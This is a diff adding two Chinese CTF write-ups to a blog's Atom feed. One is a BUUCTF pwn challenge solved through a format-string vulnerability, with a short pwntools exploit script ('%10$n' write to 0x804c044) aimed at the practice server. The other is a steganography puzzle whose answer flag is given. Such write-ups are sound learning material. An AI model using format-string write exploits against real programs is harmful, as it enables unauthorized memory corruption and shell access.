@@ -316,6 +316,30 @@
   </entry>
   
   <entry>
+    <title>BUU刷题日记_PWN5</title>
+    <link href="https://www.smartpillar.xyz/2020/10/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-PWN5/"/>
+    <id>https://www.smartpillar.xyz/2020/10/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-PWN5/</id>
+    <published>2020-10-04T06:36:46.000Z</published>
+    <updated>2022-02-24T10:37:14.841Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的刷题日记pillar’s</p><h1 id="第五空间2019-决赛-PWN5-1"><a href="#第五空间2019-决赛-PWN5-1" class="headerlink" title="[第五空间2019 决赛]PWN5 1"></a>[第五空间2019 决赛]PWN5 1</h1><p>检查一下</p><p><img src="/2020/10/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-PWN5/1.jpg" alt="img"></p><p>32位，开启canary和nx</p><p>利用strings可以找到/bin/sh</p><p><img src="/2020/10/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-PWN5/2.jpg" alt="img"></p><p>ida打开，看到system函数和printf</p><p><img src="/2020/10/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-PWN5/3.jpg" alt="img"></p><p>并且看到这里直接printf了我们输入的name</p><p><img src="/2020/10/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-PWN5/4.jpg" alt="img"></p><p>所以直接格式化字符串，将unk_804C044的值改了，然后输入相同的内容就可。</p><p>利用%08x找到格式化字符串和我们之间的距离为10</p><p><img src="/2020/10/04/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-PWN5/5.jpG" alt="img"></p><p>格式化字符串漏洞即 格式化的%n会往当前所指的地址的内容的地址写入已经打印出来的字符的长度。再利用$X（X为任意数值）来作为距离格式化字符串所在地址的偏移量，即可实现任意位置写。</p><p>然后我们在AAAA的地方写上0x804c044，在加上%10$n就可以将AAAA所在位置的内容地址写为len(0x804c044)+len(%10$n)=4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25064</span>)</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x804c044</span>)+<span class="string">&#x27;%10$n&#x27;</span></span><br><span class="line">sla(<span class="string">&#x27;name:&#x27;</span>,payload)</span><br><span class="line">sla(<span class="string">&#x27;passwd:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是没太搞懂这个要怎么在gdb里动态调试，希望有大手子教一下……</p><p>后面看别人wp，可以改写atoi的got地址为system，然后输入/user/bin</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
+      
+    
+    
+    
+    
+    <category term="补题" scheme="https://www.smartpillar.xyz/tags/%E8%A1%A5%E9%A2%98/"/>
+    
+    <category term="pwn" scheme="https://www.smartpillar.xyz/tags/pwn/"/>
+    
+  </entry>
+  
+  <entry>
     <title>BUU刷题日记_ciscn2019c1</title>
     <link href="https://www.smartpillar.xyz/2020/09/22/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn2019c1/"/>
     <id>https://www.smartpillar.xyz/2020/09/22/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn2019c1/</id>
@@ -637,6 +661,30 @@
     
     
     <category term="恶意代码" scheme="https://www.smartpillar.xyz/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>BUU刷题日记-我吃三明治</title>
+    <link href="https://www.smartpillar.xyz/2020/04/02/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E6%88%91%E5%90%83%E4%B8%89%E6%98%8E%E6%B2%BB/"/>
+    <id>https://www.smartpillar.xyz/2020/04/02/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E6%88%91%E5%90%83%E4%B8%89%E6%98%8E%E6%B2%BB/</id>
+    <published>2020-04-02T04:04:42.000Z</published>
+    <updated>2022-03-04T04:39:18.632Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的刷题日记</p><h1 id="我吃三明治"><a href="#我吃三明治" class="headerlink" title="我吃三明治"></a>我吃三明治</h1><p>开局一张jpg，用010edito打开</p><p><img src="/2020/04/02/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E6%88%91%E5%90%83%E4%B8%89%E6%98%8E%E6%B2%BB/1.jpg" alt="img"></p><p>发现unknownpadding，开到FF D8 和JFIF，可知是另一张图片，保存出来，发现是同一张图靠的近了一点</p><p><img src="/2020/04/02/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E6%88%91%E5%90%83%E4%B8%89%E6%98%8E%E6%B2%BB/2.jpg" alt="img"></p><p>而unknownpadding中间还有一段，看起来是base32，也确实是。</p><p><img src="/2020/04/02/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-%E6%88%91%E5%90%83%E4%B8%89%E6%98%8E%E6%B2%BB/3.jpg" alt="img"></p><p>flag{6f1797d4080b29b64da5897780463e30}</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
+      
+    
+    
+    
+    
+    <category term="补题" scheme="https://www.smartpillar.xyz/tags/%E8%A1%A5%E9%A2%98/"/>
+    
+    <category term="misc" scheme="https://www.smartpillar.xyz/tags/misc/"/>
     
   </entry>
   
